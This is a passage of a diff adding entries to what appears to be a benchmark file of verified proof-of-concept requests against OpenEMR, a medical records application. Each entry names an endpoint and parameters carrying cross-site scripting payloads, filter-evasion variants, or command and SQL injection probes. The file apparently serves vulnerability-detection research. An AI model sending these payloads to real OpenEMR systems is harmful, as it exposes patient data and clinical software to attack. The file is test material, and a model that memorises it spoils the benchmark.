+        "\"><a%20href=javascrip%26%2338%3B%26%2335%3B%26%2349%3B%26%2349%3B%26%2354%3B%26%2359%3B:alert(987890);>1</a>"
+      ]
+    },
+    "request_id": "requests.682c75abc2a5d",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_c81e06",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/interface/main/messages/messages.php",
+    "post_data": {
+      "form_facility": [
+        ""
+      ],
+      "form_from_date": [
+        "2025-03-30"
+      ],
+      "form_patient_id": [
+        "</title></option><script>xss(18506844)</script>"
+      ],
+      "form_patient_name": [
+        "</title></option><script>xss(23023674)</script>"
+      ],
+      "form_provider": [
+        ""
+      ],
+      "form_to_date": [
+        "'"
+      ],
+      "go": [
+        "Recalls"
+      ]
+    },
+    "query_params": {
+      "go": [
+        "Recalls"
+      ]
+    },
+    "request_id": "requests.67e96a6d86444",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_ca926f",
+    "vuln_type": "cmdi"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/interface/orders/list_reports.php",
+    "post_data": {
+      "form_external_refresh": [
+        ""
+      ],
+      "form_from_date": [
+        "2025-03-30"
+      ],
+      "form_provider": [
+        "<img src=\"x\" onerror=\"xss(68413689)\">"
+      ],
+      "form_refresh": [
+        "Submit"
+      ],
+      "form_reviewed": [
+        "3"
+      ],
+      "form_to_date": [
+        "1<scr<!--<!--%20-->%20-->ipt>alert(987890)</scr<!--<!--%20-->%20-->ipt>"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67e96a720a789",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_cb8f0c",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/interface/main/calendar/index.php",
+    "post_data": {},
+    "query_params": {
+      "framewidth": [
+        "`"
+      ],
+      "func": [
+        "view"
+      ],
+      "module": [
+        "PostCalendar"
+      ],
+      "pc_username": [
+        "xuefeng20011024"
+      ],
+      "viewtype": [
+        "day"
+      ]
+    },
+    "request_id": "requests.682c75ab10cbb",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_cd5c22",
+    "vuln_type": "cmdi"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/interface/orders/list_reports.php",
+    "post_data": {
+      "form_external_refresh": [
+        ""
+      ],
+      "form_from_date": [
+        "\""
+      ],
+      "form_patient": [
+        "</title></option><script>xss(70101065)</script>"
+      ],
+      "form_provider": [
+        "</title></option><script>xss(20619352)</script>"
+      ],
+      "form_refresh": [
+        "Submit"
+      ],
+      "form_reviewed": [
+        "3"
+      ],
+      "form_to_date": [
+        "2025-03-30"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67e96a6de89c3",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_d04ada",
+    "vuln_type": "cmdi"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/interface/main/messages/messages.php",
+    "post_data": {
+      "rcb_selectors": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ],
+      "success": [
+        ""
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.681b6e84b9037",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_d1777b",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/interface/main/calendar/index.php",
+    "post_data": {
+      "": [
+        "",
+        ""
+      ],
+      "func": [
+        "view"
+      ],
+      "jumpdate": [
+        ""
+      ],
+      "module": [
+        "PostCalendar"
+      ],
+      "pc_category": [
+        ""
+      ],
+      "pc_topic": [
+        ""
+      ],
+      "tplview": [
+        "default"
+      ],
+      "viewtype": [
+        "1<scr<!--<!--%20-->%20-->ipt>alert(987890)</scr<!--<!--%20-->%20-->ipt>"
+      ]
+    },
+    "query_params": {
+      "func": [
+        "view"
+      ],
+      "module": [
+        "PostCalendar"
+      ],
+      "pc_category": [
+        ""
+      ],
+      "pc_topic": [
+        ""
+      ],
+      "tplview": [
+        "default"
+      ]
+    },
+    "request_id": "requests.681b6e8750398",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_d3a100",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/interface/orders/procedure_stats.php",
+    "post_data": {
+      "csrf_token_form": [
+        "467b9ccfd25ca6bbddf794feeaedc86cdc0928f9"
+      ],
+      "form_by": [
+        "<script>xss(94464947)</script>"
+      ],
+      "form_facility": [
+        "<script>xss(10453807)</script>"
+      ],
+      "form_from_date": [
+        "2025-03-30"
+      ],
+      "form_output": [
+        "<script>xss(46412434)</script>"
+      ],
+      "form_sexes": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ],
+      "form_to_date": [
+        "2025-03-30"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67e96a8f8ba8a",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_da52d9",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/interface/patient_file/rules/patient_data.php",
+    "post_data": {},
+    "query_params": {
+      "category": [
+        "act_cat_assess"
+      ],
+      "item": [
+        "'"
+      ]
+    },
+    "request_id": "requests.67e96a7b25950",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_df35b5",
+    "vuln_type": "cmdi"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/interface/patient_file/reminder/patient_reminders.php",
+    "post_data": {},
+    "query_params": {
+      "mode": [
+        "simple"
+      ],
+      "patient_id": [
+        "\""
+      ],
+      "sortby": [
+        "lname, fname"
+      ],
+      "sortorder": [
+        "asc"
+      ]
+    },
+    "request_id": "requests.67e96a6b6d159",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_e1fe78",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/interface/main/messages/messages.php",
+    "post_data": {},
+    "query_params": {
+      "form_inactive": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ]
+    },
+    "request_id": "requests.682870b02dd53",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_e2e45a",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/interface/usergroup/facility_admin.php",
+    "post_data": {},
+    "query_params": {
+      "fid": [
+        "1%3Cscript%3Ealert%28987890%29%3C/script%3E"
+      ]
+    },
+    "request_id": "requests.67e96a6e809f8",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_e41c24",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/interface/main/finder/dynamic_finder.php",
+    "post_data": {},
+    "query_params": {
+      "search_any": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ]
+    },
+    "request_id": "requests.682870af5bfc6",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_e54f78",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/interface/super/edit_globals.php",
+    "post_data": {
+      "csrf_token_form": [
+        "ed0009275f8524fabaa5e4aebe48d6150756b8e0"
+      ],
+      "form_0": [
+        "main_info.php"
+      ],
+      "form_1": [
+        "../../interface/main/messages/messages.php?form_active=1"
+      ],
+      "form_10": [
+        "1"
+      ],
+      "form_11": [
+        "1"
+      ],
+      "form_12": [
+        "1"
+      ],
+      "form_13": [
+        "0"
+      ],
+      "form_14": [
+        "0"
+      ],
+      "form_16": [
+        "0"
+      ],
+      "form_19": [
+        "Y1"
+      ],
+      "form_2": [
+        "0"
+      ],
+      "form_20": [
+        "1"
+      ],
+      "form_22": [
+        "day"
+      ],
+      "form_23": [
+        "1"
+      ],
+      "form_25": [
+        "1"
+      ],
+      "form_26": [
+        "D0"
+      ],
+      "form_27": [
+        "Y1"
+      ],
+      "form_28": [
+        "0"
+      ],
+      "form_29": [
+        "<img src=\"x\" onerror=\"xss(64569799)\">"
+      ],
+      "form_3": [
+        "tabs_style_compact.css"
+      ],
+      "form_30": [
+        "0"
+      ],
+      "form_4": [
+        "style_ash_blue.css"
+      ],
+      "form_5": [
+        "736"
+      ],
+      "form_6": [
+        "0"
+      ],
+      "form_7": [
+        "dual"
+      ],
+      "form_8": [
+        "0"
+      ],
+      "form_9": [
+        "10"
+      ],
+      "form_search": [
+        ""
+      ],
+      "srch_desc": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ],
+      "toggle_0": [
+        "YES"
+      ],
+      "toggle_1": [
+        "YES"
+      ],
+      "toggle_10": [
+        "YES"
+      ],
+      "toggle_11": [
+        "YES"
+      ],
+      "toggle_12": [
+        "YES"
+      ],
+      "toggle_13": [
+        "YES"
+      ],
+      "toggle_14": [
+        "YES"
+      ],
+      "toggle_15": [
+        "YES"
+      ],
+      "toggle_16": [
+        "YES"
+      ],
+      "toggle_17": [
+        "YES"
+      ],
+      "toggle_18": [
+        "YES"
+      ],
+      "toggle_19": [
+        "YES"
+      ],
+      "toggle_2": [
+        "YES"
+      ],
+      "toggle_20": [
+        "YES"
+      ],
+      "toggle_21": [
+        "YES"
+      ],
+      "toggle_22": [
+        "YES"
+      ],
+      "toggle_23": [
+        "YES"
+      ],
+      "toggle_24": [
+        "YES"
+      ],
+      "toggle_25": [
+        "YES"
+      ],
+      "toggle_26": [
+        "YES"
+      ],
+      "toggle_27": [
+        "YES"
+      ],
+      "toggle_28": [
+        "YES"
+      ],
+      "toggle_29": [
+        "YES"
+      ],
+      "toggle_3": [
+        "YES"
+      ],
+      "toggle_30": [
+        "YES"
+      ],
+      "toggle_31": [
+        "YES"
+      ],
+      "toggle_32": [
+        "YES"
+      ],
+      "toggle_4": [
+        "YES"
+      ],
+      "toggle_5": [
+        "YES"
+      ],
+      "toggle_6": [
+        "YES"
+      ],
+      "toggle_7": [
+        "YES"
+      ],
+      "toggle_8": [
+        "YES"
+      ],
+      "toggle_9": [
+        "YES"
+      ]
+    },
+    "query_params": {
+      "mode": [
+        "user"
+      ]
+    },
+    "request_id": "requests.67e96a717b00d",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_e6f032",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/interface/main/calendar/index.php",
+    "post_data": {},
+    "query_params": {
+      "framewidth": [
+        "1337"
+      ],
+      "func": [
+        "view"
+      ],
+      "module": [
+        "PostCalendar"
+      ],
+      "pc_username": [
+        "%22%3E%3Ca%20href%3Djavascrip%26%23116%3B%3Aalert%28987890%29%3B%3E1%3C/a%3E"
+      ],
+      "viewtype": [
+        "day"
+      ]
+    },
+    "request_id": "requests.67e96a83c902e",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_e719f4",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/interface/reports/pat_ledger.php",
+    "post_data": {},
+    "query_params": {
+      "form": [
+        "1%3Cscript%3Ealert%28987890%29%3C/script%3E"
+      ]
+    },
+    "request_id": "requests.67e96a86c15cc",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_f08494",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/interface/main/messages/messages.php",
+    "post_data": {},
+    "query_params": {
+      "form_active": [
+        "1"
+      ],
+      "show_all": [
+        "no"
+      ],
+      "sortby": [
+        "users.lname"
+      ],
+      "sortorder": [
+        "ls '"
+      ]
+    },
+    "request_id": "requests.682c75acd0d75",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_f203f5",
+    "vuln_type": "cmdi"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/interface/main/calendar/index.php",
+    "post_data": {
+      "": [
+        "",
+        ""
+      ],
+      "func": [
+        "view"
+      ],
+      "jumpdate": [
+        ""
+      ],
+      "module": [
+        "PostCalendar"
+      ],
+      "pc_category": [
+        ""
+      ],
+      "pc_topic": [
+        ""
+      ],
+      "tplview": [
+        "default"
+      ],
+      "viewtype": [
+        "url(\"data:image/jpg;base64,</style><svg/onload=alert(987890)>\")"
+      ]
+    },
+    "query_params": {
+      "func": [
+        "view"
+      ],
+      "module": [
+        "PostCalendar"
+      ],
+      "pc_category": [
+        ""
+      ],
+      "pc_topic": [
+        ""
+      ],
+      "tplview": [
+        "default"
+      ]
+    },
+    "request_id": "requests.681b6e8750398",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_f25a15",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/interface/main/calendar/index.php",
+    "post_data": {
+      "": [
+        "",
+        ""
+      ],
+      "func": [
+        "view"
+      ],
+      "jumpdate": [
+        ""
+      ],
+      "module": [
+        "PostCalendar"
+      ],
+      "pc_category": [
+        ""
+      ],
+      "pc_topic": [
+        ""
+      ],
+      "tplview": [
+        "default"
+      ],
+      "viewtype": [
+        "day"
+      ]
+    },
+    "query_params": {
+      "func": [
+        "view"
+      ],
+      "module": [
+        "PostCalendar"
+      ],
+      "pc_category": [
+        "1%3Cscr%3C%21--%20--%3Eipt%3Ealert%28987890%29%3C/scr%3C%21--%20--%3Eipt%3E"
+      ],
+      "pc_topic": [
+        ""
+      ],
+      "tplview": [
+        "default"
+      ]
+    },
+    "request_id": "requests.682c75aea47b9",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_f40ac1",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/interface/patient_file/rules/patient_data.php",
+    "post_data": {},
+    "query_params": {
+      "category": [
+        "act_cat_assess"
+      ],
+      "item": [
+        "'"
+      ]
+    },
+    "request_id": "requests.67e96a7b25950",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_f53b53",
+    "vuln_type": "cmdi"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/interface/main/messages/messages.php",
+    "post_data": {
+      "": [
+        "on",
+        "on",
+        ""
+      ],
+      "begin": [
+        "0"
+      ],
+      "form_active": [
+        "`"
+      ],
+      "showall": [
+        "no"
+      ],
+      "sortby": [
+        "pnotes.date"
+      ],
+      "sortorder": [
+        "desc"
+      ],
+      "task": [
+        "delete"
+      ]
+    },
+    "query_params": {
+      "begin": [
+        "0"
+      ],
+      "form_active": [
+        "1"
+      ],
+      "showall": [
+        "no"
+      ],
+      "sortby": [
+        "pnotes.date"
+      ],
+      "sortorder": [
+        "desc"
+      ]
+    },
+    "request_id": "requests.682c75ac7dfeb",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_f585c2",
+    "vuln_type": "cmdi"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "GET",
+    "path": "/interface/main/onotes/office_comments_full.php",
+    "post_data": {},
+    "query_params": {
+      "active": [
+        "-1"
+      ],
+      "offset": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ]
+    },
+    "request_id": "requests.67e96a6978ef6",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_f9a25e",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "openemr",
+    "application_name": "OpenEMR",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-openemr-v0.1.0",
+    "method": "POST",
+    "path": "/interface/orders/orders_results.php",
+    "post_data": {
+      "form_from_date": [
+        "\"><svg onload=alert(987890)//"
+      ],
+      "form_proc_type": [
+        "-1"
+      ],
+      "form_proc_type_desc": [
+        "<a href=\"\" jaekpot-attribute=\"20062005\">jaekpot</a>"
+      ],
+      "form_refresh": [
+        "Refresh"
+      ],
+      "form_to_date": [
+        "2025-03-30"
+      ]
+    },
+    "query_params": {
+      "batch": [
+        "1"
+      ],
+      "review": [
+        "0"
+      ]
+    },
+    "request_id": "requests.67e96a6e91535",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/openemr/openemr",
+    "vuln_id": "vuln_function_ff66da",
+    "vuln_type": "xss"
+  }
+]
